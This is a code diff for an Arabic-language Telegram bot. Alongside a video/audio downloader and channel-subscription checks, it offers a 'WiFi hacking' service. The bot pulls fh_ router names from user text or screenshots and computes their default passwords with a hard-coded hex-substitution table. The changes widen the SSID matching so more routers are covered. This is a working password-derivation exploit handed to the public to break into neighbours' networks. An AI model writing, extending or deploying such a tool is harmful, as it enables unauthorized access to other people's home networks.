@@ -1,4 +1,4 @@
-# bot.py (نسخة كاملة مع Connection Pool و CSV exports و is_user_joined)
+# bot.py (النسخة النهائية - دعم اللواحق مثل _5g وحذف الرسائل)
 import os
 import time
 import tempfile
@@ -45,7 +45,7 @@ if not DATABASE_URL:
 
 # أنشئ pool عند بدء التطبيق
 DB_MIN_CONN = 1
-DB_MAX_CONN = 6  # عدّل إذا أردت
+DB_MAX_CONN = 6 
 try:
     pool = SimpleConnectionPool(DB_MIN_CONN, DB_MAX_CONN, DATABASE_URL, cursor_factory=RealDictCursor, sslmode='require')
     logging.info("Connection pool created.")
@@ -138,7 +138,7 @@ def is_banned(user_id):
 def ban_user(user_id, duration=BAN_DURATION):
     if int(user_id) == OWNER_ID:
         return
-    ban_until_dt = datetime.utcnow() + timedelta(seconds=duration)  # تخزين وقت حقيقي
+    ban_until_dt = datetime.utcnow() + timedelta(seconds=duration)
     conn = get_db_conn()
     try:
         with conn:
@@ -178,27 +178,16 @@ def has_joined_before(user_id):
     finally:
         put_db_conn(conn)
 
-# ===== دالة التحقق من اشتراك المستخدم (مضافة) =====
+# ===== دالة التحقق من اشتراك المستخدم =====
 def is_user_joined(user_id):
-    """
-    التحقق من اشتراك المستخدم في القناة.
-    يعيد True إذا العضو موجود (member/creator/administrator)، وإلا False.
-    يكتب في اللوق أي استثناء (مثلاً لو البوت ليس مشرفًا أو CHANNEL_USERNAME خاطئ).
-    """
     try:
-        # المالك دائمًا مسموح له
         if int(user_id) == OWNER_ID:
             return True
-
-        # استدعاء API لفحص العضوية
-        # تأكد أن CHANNEL_USERNAME هو username القناة بدون @
         member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", int(user_id))
         status = getattr(member, "status", None)
-        logging.info("get_chat_member(%s) => status=%s", user_id, status)
         return status in ('member', 'creator', 'administrator')
     except telebot.apihelper.ApiException as e:
-        # يحدث هذا غالبًا لو أن البوت ليس مشرفًا أو اسم القناة خاطئ أو البوت محظور
-        logging.exception("ApiException in is_user_joined — تأكد أن البوت مشرف و CHANNEL_USERNAME صحيح: %s", e)
+        logging.exception("ApiException in is_user_joined: %s", e)
         return False
     except Exception as e:
         logging.exception("Unexpected error in is_user_joined: %s", e)
@@ -274,7 +263,7 @@ def check_access(message_or_call):
         return False
     return True
 
-# ===== أوامر المالك مع إرسال ملفات CSV كمستندات =====
+# ===== أوامر المالك =====
 @bot.message_handler(commands=['get_users'])
 def get_users_handler(message):
     if int(message.from_user.id) != OWNER_ID:
@@ -327,7 +316,6 @@ def get_banned_handler(message):
             bot.send_message(message.chat.id, "لا يوجد محظورين.")
             return
 
-        # أنشئ ملف CSV مؤقت
         fd, path = tempfile.mkstemp(suffix=".csv")
         try:
             with os.fdopen(fd, "w", newline='', encoding='utf-8') as csvfile:
@@ -335,31 +323,25 @@ def get_banned_handler(message):
                 writer.writerow(["user_id", "ban_until_epoch", "ban_until_readable"])
                 for r in rows:
                     bu = r.get('ban_until')
-                    # افحص نوع القيمة وتعامل معها
                     if bu is None:
                         epoch_val = ""
                         readable = ""
                     else:
-                        # لو كانت قيمة من نوع datetime (Postgres timestamp) -> حولها
                         try:
-                            # psycopg يعود عادة بكائن datetime للـ timestamp
                             from datetime import datetime
                             if isinstance(bu, datetime):
                                 epoch_val = int(bu.timestamp())
                                 readable = bu.strftime('%Y-%m-%d %H:%M:%S')
                             else:
-                                # لو كانت نص أو رقم (epoch)
                                 try:
                                     epoch_val = int(bu)
                                     readable = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(epoch_val))
                                 except Exception:
-                                    # كحل افتراضي: حوّل إلى نص
                                     epoch_val = str(bu)
                                     readable = str(bu)
                         except Exception:
                             epoch_val = str(bu)
                             readable = str(bu)
-
                     writer.writerow([r['user_id'], epoch_val, readable])
 
             with open(path, "rb") as f:
@@ -383,15 +365,10 @@ def stats_handler(message):
             with conn.cursor() as cur:
                 cur.execute("SELECT COUNT(*) AS c FROM users")
                 total_users = cur.fetchone()['c']
-
                 cur.execute("SELECT COUNT(*) AS c FROM joined_users")
                 total_joined = cur.fetchone()['c']
-
-                # المحظورون النشطون الآن (ban_until أكبر من الوقت الحالي)
                 cur.execute("SELECT COUNT(*) AS c FROM bans WHERE ban_until > now()")
                 active_bans = cur.fetchone()['c']
-
-                # مستخدمون جدد اليوم (اختياري لكنه مفيد)
                 cur.execute("SELECT COUNT(*) AS c FROM users WHERE first_seen >= now() - interval '1 day'")
                 new_today = cur.fetchone()['c']
         put_db_conn(conn)
@@ -482,7 +459,7 @@ def unban_user_command(message):
         logging.exception("unban_user_command error: %s", e)
         bot.reply_to(message, "حدث خطأ أثناء إلغاء الحظر.")
 
-# ===== بقية واجهة البوت (تحميل + WiFi) - نفس المنطق السابق مع بعض التحسينات =====
+# ===== بقية واجهة البوت =====
 def show_main_menu(chat_id, msg_only=False):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("🎬 أداة تحميل mp3/mp4", "📡 أداة اختراق WiFi fh")
@@ -516,43 +493,54 @@ def start_handler(message):
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_join")
 def check_join_callback(call):
-    # أجب فورًا على الـ callback حتى يتوقف العميل عن الإعادة
-    try:
-        bot.answer_callback_query(call.id, text="جاري التحقق...")  # رسالة قصيرة للمستخدم (اختياري)
-    except Exception:
-        pass
-
-    # الآن نفّذ باقي المنطق
     user_id = call.from_user.id
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+
     ban_left = is_banned(user_id)
     if ban_left > 0:
-        send_ban_with_check(call.message.chat.id, ban_left)
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=message_id,
+            text=f"❌ أنت محظور لمدة {ban_left // 60} دقيقة."
+        )
         return
 
     if is_user_joined(user_id):
         save_joined_user(user_id)
+        
+        # حذف الرسالة القديمة
+        try:
+            bot.delete_message(chat_id, message_id)
+        except:
+            pass
+            
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
         markup.add("🎬 أداة تحميل mp3/mp4", "📡 أداة اختراق WiFi fh")
+        
+        bot.send_message(
+            chat_id, 
+            "✅ **تم التحقق بنجاح!**\nأهلاً بك، اختر الخدمة من الأسفل 👇", 
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+        user_state[chat_id] = "main_menu"
+    else:
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("📢 انضم للقناة", url=f"https://t.me/{CHANNEL_USERNAME}"),
+            types.InlineKeyboardButton("🔄 تحقق مرة أخرى", callback_data="check_join")
+        )
         try:
             bot.edit_message_text(
-                "✅ تم التحقق من اشتراكك في القناة!\n\nاختر الخدمة التي تريد استخدامها:",
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                reply_markup=markup
+                chat_id=chat_id,
+                message_id=message_id,
+                text="⚠️ **عذراً، لم تنضم للقناة بعد!**\nيرجى الانضمام ثم الضغط على تحقق.",
+                reply_markup=markup,
+                parse_mode="Markdown"
             )
-        except Exception as e:
-            # لو فشل التعديل، رُسل رسالة عادية
-            logging.exception("edit_message_text failed in check_join_callback: %s", e)
-            bot.send_message(call.message.chat.id, "✅ تم التحقق من اشتراكك في القناة!\n\nاختر الخدمة التي تريد استخدامها:", reply_markup=markup)
-        user_state[call.message.chat.id] = "main_menu"
-    else:
-        if has_joined_before(user_id):
-            ban_user(user_id)
-            send_ban_with_check(call.message.chat.id, BAN_DURATION)
-        else:
-            send_warning_join(call.message.chat.id)
-            user_state[call.message.chat.id] = "warned"
-
+        except:
+            pass
 
 @bot.callback_query_handler(func=lambda call: call.data == "recheck")
 def recheck_callback(call):
@@ -571,15 +559,14 @@ def recheck_callback(call):
         save_joined_user(user_id)
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
         markup.add("🎬 أداة تحميل mp3/mp4", "📡 أداة اختراق WiFi fh")
+        
+        # حذف رسالة الحظر القديمة
         try:
-            bot.edit_message_text(
-                "✅ تم التحقق من اشتراكك في القناة!\n\nاختر الخدمة التي تريد استخدامها:",
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                reply_markup=markup
-            )
-        except Exception:
-            bot.send_message(call.message.chat.id, "✅ تم التحقق من اشتراكك في القناة!\n\nاختر الخدمة التي تريد استخدامها:", reply_markup=markup)
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+        except:
+            pass
+            
+        bot.send_message(call.message.chat.id, "✅ تم التحقق من اشتراكك في القناة!\n\nاختر الخدمة التي تريد استخدامها:", reply_markup=markup)
         user_state[call.message.chat.id] = "main_menu"
     else:
         ban_user(user_id)
@@ -675,20 +662,35 @@ def handle_link(message):
         caption = caption
 
     bot.send_message(message.chat.id, caption, parse_mode="HTML", reply_markup=markup)
-    bot.send_message(message.chat.id, "⬅️ للرجوع اضغط على زر 🔙 رجوع في الأسفل.", reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True).add("🔙 رجوع"))
     user_state[message.chat.id] = "waiting_link"
 
 @bot.callback_query_handler(func=lambda call: call.data in ("video", "audio"))
 def process_download(call):
     if not check_access(call):
         return
+
+    chat_id = call.message.chat.id
+    message_id = call.message.message_id
+    
     url = user_links.get(call.from_user.id)
     action = call.data
+
     if not url:
-        bot.answer_callback_query(call.id, "❌ لم يتم العثور على رابط، أرسل الرابط من جديد.")
+        bot.answer_callback_query(call.id, "❌ الرابط غير موجود أو انتهت صلاحيته.")
         return
-    msg = bot.send_message(call.message.chat.id, "⏳ جاري التحميل، انتظر قليلاً...")
+
+    try:
+        bot.edit_message_text(
+            text="⏳ **جاري التحميل والمعالجة... يرجى الانتظار قليلاً**",
+            chat_id=chat_id,
+            message_id=message_id,
+            parse_mode="Markdown"
+        )
+    except Exception:
+        pass
+
     tmpdir = tempfile.mkdtemp()
+    
     try:
         ydl_opts = {
             'outtmpl': os.path.join(tmpdir, '%(title)s.%(ext)s'),
@@ -702,42 +704,49 @@ def process_download(call):
                 'preferredcodec': 'mp3',
                 'preferredquality': '192',
             }]
+            
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             info = ydl.extract_info(url, download=True)
             if action == "video":
                 filename = ydl.prepare_filename(info)
             else:
-                filename = ydl.prepare_filename(info).rsplit('.', 1)[0] + ".mp3"
+                base_name = ydl.prepare_filename(info).rsplit('.', 1)[0]
+                filename = base_name + ".mp3"
 
         if not os.path.exists(filename):
             try:
-                bot.edit_message_text("❌ فشل التحميل أو الملف غير موجود.", call.message.chat.id, msg.message_id)
+                bot.edit_message_text("❌ فشل التحميل أو الملف غير موجود.", chat_id, message_id)
             except:
                 pass
         else:
             max_bytes = 45 * 1024 * 1024
             size = os.path.getsize(filename)
+            
             if size > max_bytes:
                 try:
-                    bot.edit_message_text("❌ الملف كبير جداً ولا يمكن إرساله عبر التليجرام.", call.message.chat.id, msg.message_id)
+                    bot.edit_message_text("❌ الملف كبير جداً (أكبر من 50 ميجابايت) ولا يمكن إرساله.", chat_id, message_id)
                 except:
                     pass
             else:
                 with open(filename, "rb") as f:
                     if action == "video":
-                        bot.send_video(call.message.chat.id, f, caption="✅ تم التحميل بنجاح! 🎬")
+                        bot.send_video(chat_id, f, caption="✅ تم التحميل بنجاح! 🎬")
                     else:
-                        bot.send_audio(call.message.chat.id, f, caption="✅ تم التحميل بنجاح! 🎵")
+                        bot.send_audio(chat_id, f, caption="✅ تم التحميل بنجاح! 🎵")
+                
+                # حذف رسالة "جاري التحميل" بعد الإرسال
                 try:
-                    bot.delete_message(call.message.chat.id, msg.message_id)
+                    bot.delete_message(chat_id, message_id)
                 except:
                     pass
+
     except Exception as e:
         logging.exception("download error: %s", e)
         try:
-            bot.edit_message_text("❌ حدث خطأ أثناء التحميل، يرجى إعادة المحاولة.", call.message.chat.id, msg.message_id)
+            bot.edit_message_text("❌ حدث خطأ أثناء التحميل.", chat_id, message_id)
         except:
             pass
+            
     finally:
         try:
             for root, dirs, files in os.walk(tmpdir):
@@ -755,10 +764,10 @@ def process_download(call):
 
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
     markup.add("منصة أخرى", "نفس المنصة", "🔙 رجوع")
-    bot.send_message(call.message.chat.id, "💡 ماذا تريد أن تفعل الآن؟", reply_markup=markup)
-    user_state[call.message.chat.id] = "waiting_link"
-
-# ===== WiFi tool (كما قبل) =====
+    bot.send_message(chat_id, "💡 ماذا تريد أن تفعل الآن؟", reply_markup=markup)
+    user_state[chat_id] = "waiting_link"
+    
+# ===== WiFi tool =====
 def show_wifi_methods(chat_id):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("✍️ كتابة اسم الراوتر", "🖼️ صورة لجميع الراوترات", "🔙 رجوع")
@@ -815,6 +824,13 @@ def extract_ssids_from_text(text):
     return re.findall(r'(fh_[a-zA-Z0-9]{6,7})', text)
 
 def smart_correct_ssid(ssid):
+    # [تعديل] نأخذ الجزء الأساسي فقط إذا كان يحتوي على لواحق
+    parts = ssid.split('_')
+    # إذا كان هناك أكثر من جزئين (fh و الجزء الثاني و لاحقة)
+    if len(parts) >= 2:
+        # نعيد بناؤه ليكون fh_xxxx فقط
+        ssid = f"{parts[0]}_{parts[1]}"
+        
     if ssid.startswith("fh_"):
         prefix = "fh_"
         rest = ssid[3:]
@@ -825,12 +841,21 @@ def smart_correct_ssid(ssid):
         return prefix + rest
     return ssid
 
-@bot.message_handler(content_types=['photo'])
 def process_wifi_image(message):
     if not check_access(message):
         return
+    
     wait_msg = bot.send_message(message.chat.id, "⏳ جاري معالجة الصورة، يرجى الانتظار...")
+    
     try:
+        if not message.photo:
+            try:
+                bot.delete_message(message.chat.id, wait_msg.message_id)
+            except:
+                pass
+            bot.send_message(message.chat.id, "❌ لم يتم إرسال صورة صالحة.")
+            return
+
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded_file = bot.download_file(file_info.file_path)
         image = Image.open(io.BytesIO(downloaded_file))
@@ -866,41 +891,65 @@ def process_wifi_image(message):
     all_ssids = []
     seen = set()
     for text in texts:
-        found = re.findall(r'(fh_[a-zA-Z0-9]{6,7})', text)
+        # [تعديل Regex] للسماح بوجود لاحقة (suffix) بعد الجزء الثاني
+        # يلتقط fh_xxxx أو fh_xxxx_yyyy
+        found = re.findall(r'(fh_[a-fA-F0-9]+(?:_[a-zA-Z0-9]+)?)', text, re.IGNORECASE)
         for ssid in found:
-            ssid_corrected = smart_correct_ssid(ssid)
-            hex_part = ssid_corrected[3:]
-            if ssid_corrected not in seen and all(c in '0123456789abcdef' for c in hex_part.lower()):
-                seen.add(ssid_corrected)
-                all_ssids.append(ssid_corrected)
+            ssid_corrected = smart_correct_ssid(ssid.lower())
+            
+            # التأكد من صحة الجزء الثاني
+            parts = ssid_corrected.split('_')
+            if len(parts) >= 2:
+                hex_part = parts[1]
+                if ssid_corrected not in seen and all(c in '0123456789abcdef' for c in hex_part):
+                    seen.add(ssid_corrected)
+                    all_ssids.append(ssid_corrected)
 
+    # حذف رسالة الانتظار
     try:
         bot.delete_message(message.chat.id, wait_msg.message_id)
     except:
         pass
 
     if not all_ssids:
-        bot.send_message(message.chat.id, "❌ لم يتم العثور على أي شبكة تبدأ بـ fh_ في الصورة.\nيرجى التأكد من وضوح الصورة أو إرسال لقطة شاشة مباشرة من الجهاز.")
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        markup.add("🔙 رجوع")
+        bot.send_message(message.chat.id, "❌ لم يتم العثور على أي شبكة تبدأ بـ fh_ في الصورة.\nيرجى التأكد من وضوح الصورة.", reply_markup=markup)
+        bot.register_next_step_handler(message, process_wifi_image_with_back)
         return
 
     reply = ""
     for ssid in all_ssids:
         password = generate_wifi_password(ssid)
-        reply += f"📶 <b>{ssid}</b>\n🔑 <code>{password}</code>\n\n"
+        if password:
+            # نعرض الاسم الأصلي (أو المصحح) وكلمة السر
+            reply += f"📶 <b>{ssid}</b>\n🔑 <code>{password}</code>\n\n"
+    
     reply += "📋 يمكنك نسخ كلمة السر بالضغط عليها."
 
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.add("🔁 اختراق WiFi آخر", "🔙 رجوع")
     bot.send_message(message.chat.id, reply, parse_mode="HTML", reply_markup=markup)
 
+# [تعديل] دالة توليد الباسوورد لتقبل اللواحق وتتجاهلها
 def generate_wifi_password(ssid):
     ssid = ssid.strip().lower()
     if not ssid.startswith("fh_"):
         return None
-    hex_part = ssid[3:]
+        
+    # [المنطق الجديد] تقسيم النص وأخذ الجزء الثاني فقط
+    parts = ssid.split('_')
+    # parts[0] = "fh", parts[1] = "hex_code", parts[2] = "suffix" (optional)
+    
+    if len(parts) < 2:
+        return None
+        
+    hex_part = parts[1] # نأخذ فقط ما بين الشرطة الأولى والثانية
+    
     valid_chars = '0123456789abcdef'
     if not all(c in valid_chars for c in hex_part):
         return None
+        
     table = {
         '0': 'f', '1': 'e', '2': 'd', '3': 'c',
         '4': 'b', '5': 'a', '6': '9', '7': '8',
@@ -910,6 +959,7 @@ def generate_wifi_password(ssid):
     encoded = ''.join(table.get(c, c) for c in hex_part)
     return f"wlan{encoded}"
 
+# [تعديل] دالة الإدخال اليدوي لتقبل اللواحق وتتجاهلها
 def generate_password(message):
     if not check_access(message):
         return
@@ -920,10 +970,17 @@ def generate_password(message):
         bot.send_message(message.chat.id, "❌ لم يتم التعرف على الشبكة. أعد المحاولة.", reply_markup=markup)
         return
 
-    hex_part = ssid[3:]
+    # [المنطق الجديد] تقسيم النص وأخذ الجزء الثاني فقط
+    parts = ssid.split('_')
+    if len(parts) < 2:
+         bot.send_message(message.chat.id, "❌ صيغة غير صحيحة.")
+         return
+
+    hex_part = parts[1]
+    
     valid_chars = '0123456789abcdef'
     if not all(c in valid_chars for c in hex_part):
-        bot.send_message(message.chat.id, "❌ صيغة غير صحيحة.")
+        bot.send_message(message.chat.id, "❌ صيغة غير صحيحة (يجب أن يحتوي الجزء الأوسط على أرقام وحروف a-f فقط).")
         return
 
     table = {
@@ -940,6 +997,7 @@ def generate_password(message):
         markup.add("🔁 اختراق WiFi آخر", "🔙 رجوع")
         bot.send_message(message.chat.id,
             f"✅ تم توليد كلمة السر الخاصة بالشبكة:\n\n"
+            f"📶 <b>الشبكة:</b> {ssid}\n"
             f"🔑 <b>كلمة السر:</b>\n"
             f"<code>{password}</code>\n\n"
             f"📋 يمكنك نسخ كلمة السر بالضغط عليها.",
@@ -960,30 +1018,8 @@ def fallback_handler(message):
 def webhook():
     if request.headers.get('content-type') == 'application/json':
         json_string = request.get_data().decode('utf-8')
-        # سجّل بداية التحديث (مقتطف حتى 1000 حرف لتفادي زيادة اللوق)
-        try:
-            logging.info("Received update (start): %s", json_string[:1000])
-        except Exception:
-            pass
-
         try:
             update = telebot.types.Update.de_json(json_string)
-            # سجّل نوع التحديث الأساسي (رسالة أو callback)
-            try:
-                if update.message:
-                    logging.info("Update => message from=%s chat_id=%s text=%s",
-                                 update.message.from_user.id,
-                                 update.message.chat.id,
-                                 getattr(update.message, 'text', None))
-                elif update.callback_query:
-                    logging.info("Update => callback from=%s data=%s",
-                                 update.callback_query.from_user.id,
-                                 update.callback_query.data)
-                else:
-                    logging.info("Update => other type: %s", dir(update))
-            except Exception:
-                pass
-
             bot.process_new_updates([update])
             return '', 200
         except Exception as e:
